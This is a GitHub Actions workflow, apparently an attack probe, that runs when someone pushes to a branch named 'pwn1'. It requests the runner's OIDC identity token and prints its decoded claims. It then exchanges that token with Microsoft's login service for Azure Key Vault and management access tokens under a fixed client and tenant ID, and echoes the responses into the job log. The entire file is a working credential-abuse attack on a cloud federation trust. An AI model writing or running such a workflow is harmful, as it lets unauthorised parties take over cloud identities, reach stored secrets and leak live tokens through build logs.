name: mine
on:
  push:
    branches: [pwn1]
permissions:
  id-token: write
  contents: read
jobs:
  x:
    runs-on: ubuntu-latest
    steps:
      - env:
          CID: 72ff278a-9e71-43ec-bac4-2ca303f8e462
          TID: 3205c325-06a5-4171-9ce8-ffc5e6c2845e
        run: |
          set -x
          IDT=$(curl -sS -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
          echo "IDT_LEN=${#IDT}"
          echo "$IDT" | cut -d. -f2 | base64 -d 2>/dev/null | head -c 1200; echo
          for SCOPE in "https://vault.azure.net/.default" "https://management.azure.com/.default"; do
            RESP=$(curl -sS -X POST "https://login.microsoftonline.com/${TID}/oauth2/v2.0/token" -d "client_id=${CID}" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" -d "client_assertion=${IDT}" --data-urlencode "scope=${SCOPE}")
            echo "SCOPE=$SCOPE RESP=$(echo "$RESP" | head -c 500)"
          done
